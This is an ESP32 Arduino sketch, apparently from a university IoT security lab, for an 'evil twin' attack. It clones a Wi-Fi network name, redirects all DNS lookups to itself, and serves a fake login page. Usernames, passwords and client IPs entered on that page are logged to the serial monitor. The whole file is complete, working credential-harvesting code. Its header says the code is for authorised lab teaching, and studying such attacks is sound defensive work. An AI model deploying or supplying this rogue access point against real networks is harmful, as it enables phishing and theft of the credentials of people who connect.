/*
 * ESP32 Evil Twin AP + Captive Portal
 * Category: WiFi Attacks
 *
 * Creates a rogue open AP cloning a target SSID. Redirects all
 * DNS to the ESP32 which serves a credential-harvesting login
 * page. Captured credentials are logged to Serial Monitor.
 *
 * Board  : ESP32 DevKit V1
 * Library: WiFi.h, WebServer.h, DNSServer.h (all built-in)
 * KLS GIT Belagavi — IoT Security Lab | Authorized use only.
 */
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

const char* AP_SSID = "Free_Airport_WiFi";  // <-- Change to target SSID

DNSServer dns;
WebServer srv(80);

const char PAGE[] PROGMEM = R"rawhtml(
<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Network Login</title><style>
body{font-family:Arial;max-width:380px;margin:50px auto;padding:16px}
input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;border:1px solid #ccc}
button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;cursor:pointer}
</style></head><body>
<h2>&#x1F4F6; WiFi Login Required</h2>
<form method='POST' action='/login'>
  Username<br><input name='u' type='text' autocomplete='off'><br>
  Password<br><input name='p' type='password'><br><br>
  <button>Connect to Internet</button>
</form></body></html>)rawhtml";

void root()  { srv.send(200, "text/html", PAGE); }
void login() {
  Serial.printf("[CAPTURE] user=%-20s pass=%s  from=%s\n",
    srv.arg("u").c_str(), srv.arg("p").c_str(),
    srv.client().remoteIP().toString().c_str());
  srv.send(200, "text/html", "<h3>Authenticating... please wait.</h3>");
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(AP_SSID);
  IPAddress ip = WiFi.softAPIP();
  dns.start(53, "*", ip);
  srv.on("/", HTTP_GET, root);
  srv.on("/login", HTTP_POST, login);
  srv.onNotFound(root);
  srv.begin();
  Serial.printf("[*] Evil Twin '%s' live at %s\n", AP_SSID, ip.toString().c_str());
}

void loop() {
  dns.processNextRequest();
  srv.handleClient();
}
